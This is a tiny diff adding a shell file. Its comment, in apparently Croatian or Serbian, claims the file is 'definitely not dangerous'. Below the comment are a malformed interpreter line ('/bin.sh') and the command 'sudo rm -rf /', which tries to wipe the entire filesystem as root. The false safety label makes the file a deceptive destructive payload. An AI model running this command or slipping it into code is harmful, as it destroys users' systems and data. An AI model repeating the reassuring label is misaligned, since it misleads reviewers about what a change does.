@@ -1,0 +1,3 @@
+#definitivno nije opasan.
+/bin.sh
+sudo rm -rf /
